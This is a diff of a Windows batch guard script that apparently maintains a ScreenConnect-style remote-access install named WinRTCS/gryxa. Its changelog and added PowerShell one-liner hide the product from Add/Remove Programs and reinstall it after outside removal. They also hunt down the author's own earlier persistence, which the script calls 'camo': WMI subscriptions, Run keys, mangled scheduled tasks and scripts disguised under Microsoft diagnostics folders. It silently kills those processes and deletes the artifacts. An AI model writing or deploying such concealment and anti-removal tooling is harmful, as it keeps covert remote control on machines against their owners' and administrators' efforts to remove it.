@@ -10,14 +10,15 @@ rem   async cmdlet) + post-install re-shield; failures bump streak; ~10 min rech
 rem 0.0.5: external-kill brake (3 consecutive exit-0-but-dead installs -> pause, hourly recheck)
 rem   + failure forensics (ImagePath, binary existence, SCM start-failure events).
 rem 0.0.6: WaitSvc actively sc-starts a detected-but-stopped service + logs raw StartService codes.
-rem 0.0.7: hunt our own ghost. Hosts that never updated since the gryxa-wars era still carry OLD
-rem   anti-gryxa automation (WMI permanent subscriptions live in the WMI repository and survive
-rem   the bootstrap's name-based filesystem/task wipe). PC-EVITA-X6: service entry deleted within
-rem   seconds of 7045 with zero events and product registration intact - event-driven killer.
-rem   On any external-kill signature: remove WMI consumers/filters/bindings and non-WinRTCS tasks
-rem   matching legacy markers (gryxa|wucache|etlcache|own_|zerocool|<gryxa FP>). Also: hide gryxa
-rem   from Add/Remove Programs (backup then delete ARP Uninstall keys, re-asserted every run;
-rem   product stays manageable via ProductCode).
+rem 0.0.7: hunt our own ghost (WMI permanent subscriptions survive the bootstrap's name-based
+rem   wipe; they live in the WMI repository) + hide gryxa from Add/Remove Programs.
+rem 0.0.8: HuntKiller expanded after PC-EVITA-X6 autopsy - legacy camo persistence found there:
+rem   SystemHealthMonitor WMI timer -> Diagnosis\ETLParser.ps1, DiagnosticsService Run key (same
+rem   script), WindowsDiagnostics Run key -> NetTrace\NetTraceParser.ps1, BVTConsumer ->
+rem   .wucache\wucache.vbs, mangled task literally named %V. Now also: kill matching processes
+rem   (self-PID + ScreenConnect/winrtcs excluded), strip Run/RunOnce values by data match,
+rem   delete camo script files, remove %-mangled tasks, run EVERY guard cycle at begin, and
+rem   auto-reset the extkill brake when anything was actually removed (fresh install chance).
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CURL=%SystemRoot%\System32\curl.exe"
@@ -53,6 +54,12 @@ echo [%DATE% %TIME%] guard_begin host=%COMPUTERNAME% streak=!STREAK! extkill=!EX
 
 call :Shields
 call :HideARP
+call :HuntKiller
+if exist "%ZD%\killer.flag" (
+  del /f /q "%ZD%\killer.flag" >nul 2>&1
+  set "EXTK=0" & echo 0>"%EXTF%"
+  echo [%DATE% %TIME%] ghost_removed_brake_reset>>"%LOG%"
+)
 
 call :Detect
 if not defined GSVC (
@@ -300,9 +307,9 @@ if exist "%ZD%\svc_dead.out" ( type "%ZD%\svc_dead.out">>"%LOG%" & del /f /q "%Z
 exit /b 0
 
 :HuntKiller
-rem --- our own ghost: legacy anti-gryxa automation survives in the WMI repository / as tasks on
-rem --- hosts that never received cleanup updates. Remove anything matching legacy markers. ---
-powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $o=@(); $pat='gryxa|wucache|etlcache|own_mon|own_lib|own_gryxa|zerocool|36e506ff016b2151'; $cons=Get-CimInstance -Namespace root\subscription -ClassName __EventConsumer | Where-Object { ($_.CommandLineTemplate -and ($_.CommandLineTemplate -match $pat)) -or ($_.Name -match $pat) }; foreach($c in $cons){ $o+=('wmi_consumer_killed ' + $c.Name); Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Consumer -match [regex]::Escape($c.Name) } | Remove-CimInstance; Remove-CimInstance $c }; $filts=Get-CimInstance -Namespace root\subscription -ClassName __EventFilter | Where-Object { ($_.Query -and ($_.Query -match $pat)) -or ($_.Name -match $pat) }; foreach($f in $filts){ $o+=('wmi_filter_killed ' + $f.Name); Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter -match [regex]::Escape($f.Name) } | Remove-CimInstance; Remove-CimInstance $f }; $tasks=Get-ScheduledTask | Where-Object { ($_.TaskName -match $pat) -and ($_.TaskPath -notmatch 'WinRTCS') }; foreach($t in $tasks){ $acts=($t.Actions | ForEach-Object { $_.Execute + ' ' + $_.Arguments }) -join ';'; if($acts -notmatch 'winrtcs'){ $o+=('task_killed ' + $t.TaskPath + $t.TaskName); Unregister-ScheduledTask -TaskName $t.TaskName -TaskPath $t.TaskPath -Confirm:$false } }; if(-not $o){ $o+='killer_not_found_wmi_tasks' }; $o | Set-Content -Path '%ZD%\killer.out' -Encoding ASCII" >nul 2>&1
+rem --- our own ghosts: legacy camo persistence (WMI subs, Run keys, mangled tasks, scripts).
+rem --- Runs every cycle. Sets killer.flag when anything was removed (brake reset at begin). ---
+powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $o=@(); $pat='gryxa|wucache|etlcache|own_mon|own_lib|own_gryxa|zerocool|36e506ff016b2151|ETLParser|NetTraceParser'; Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -and ($_.CommandLine -match $pat) -and ($_.CommandLine -notmatch 'ScreenConnect|winrtcs') -and ($_.ProcessId -ne $PID) } | ForEach-Object { $o+=('proc_killed ' + $_.Name + ' pid=' + $_.ProcessId); Stop-Process -Id $_.ProcessId -Force }; $cons=Get-CimInstance -Namespace root\subscription -ClassName __EventConsumer | Where-Object { (($_.CommandLineTemplate) -and ($_.CommandLineTemplate -match $pat)) -or ($_.Name -match $pat) }; foreach($c in $cons){ $o+=('wmi_consumer_killed ' + $c.Name); Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Consumer -match [regex]::Escape($c.Name) } | Remove-CimInstance; Remove-CimInstance $c }; $filts=Get-CimInstance -Namespace root\subscription -ClassName __EventFilter | Where-Object { (($_.Query) -and ($_.Query -match $pat)) -or ($_.Name -match $pat) }; foreach($f in $filts){ $o+=('wmi_filter_killed ' + $f.Name); Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding | Where-Object { $_.Filter -match [regex]::Escape($f.Name) } | Remove-CimInstance; Remove-CimInstance $f }; $tasks=Get-ScheduledTask | Where-Object { $_.TaskPath -notmatch 'WinRTCS' }; foreach($t in $tasks){ $acts=($t.Actions | ForEach-Object { $_.Execute + ' ' + $_.Arguments }) -join ';'; if((($t.TaskName -match $pat) -or ($acts -match $pat) -or ($t.TaskName -match '^%[A-Z]$')) -and ($acts -notmatch 'winrtcs')){ $o+=('task_killed ' + $t.TaskPath + $t.TaskName); Unregister-ScheduledTask -TaskName $t.TaskName -TaskPath $t.TaskPath -Confirm:$false } }; foreach($rk in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce'){ $p=Get-ItemProperty $rk; if($p){ foreach($prop in $p.PSObject.Properties){ if(($prop.Value -is [string]) -and ($prop.Value -match $pat) -and ($prop.Value -notmatch 'ScreenConnect|winrtcs')){ $o+=('runkey_killed ' + $prop.Name); Remove-ItemProperty -Path $rk -Name $prop.Name -Force } } } }; foreach($f in 'C:\ProgramData\Microsoft\Diagnosis\ETLParser.ps1','C:\ProgramData\Microsoft\NetTrace\NetTraceParser.ps1','C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\wucache.vbs'){ if(Test-Path $f){ Remove-Item $f -Force; $o+=('file_killed ' + $f) } }; if(Test-Path 'C:\ProgramData\Microsoft\NetTrace'){ Remove-Item 'C:\ProgramData\Microsoft\NetTrace' -Recurse -Force; $o+='dir_killed NetTrace' }; if($o){ $o | Set-Content -Path '%ZD%\killer.out' -Encoding ASCII; '1' | Set-Content -Path '%ZD%\killer.flag' -Encoding ASCII }" >nul 2>&1
 if exist "%ZD%\killer.out" ( type "%ZD%\killer.out">>"%LOG%" & del /f /q "%ZD%\killer.out" >nul 2>&1 )
 exit /b 0
 
